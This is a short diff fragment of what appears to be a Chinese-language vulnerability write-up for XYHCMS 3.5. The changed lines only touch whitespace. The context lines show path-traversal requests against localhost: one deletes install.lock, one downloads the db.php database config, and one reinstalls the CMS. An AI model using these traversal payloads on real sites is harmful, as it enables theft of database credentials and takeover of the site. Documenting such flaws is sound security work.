@@ -58,9 +58,9 @@ POST数据：key[]= ../../../install/install.lock
 http://127.0.0.1/xyhcms_3.5_20171128/uploads_code/xyhai.php?s=/Database/downFile/file/..\\..\\..\\App\\Common\\Conf\\db.php/type/zip
 ```
 
-3. 接下来直接访问 
+3. 接下来直接访问 
 
-http://127.0.0.1/xyhcms_3.5_20171128/uploads_code/install 重装 cms
+http://127.0.0.1/xyhcms_3.5_20171128/uploads_code/install 重装 cms
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2vmuE6BoXNuNgVZZ7urzQcPpjGriabWjF0Zfd3k9n4vNBxlGLsr0EdXg/640?wx_fmt=png)
 
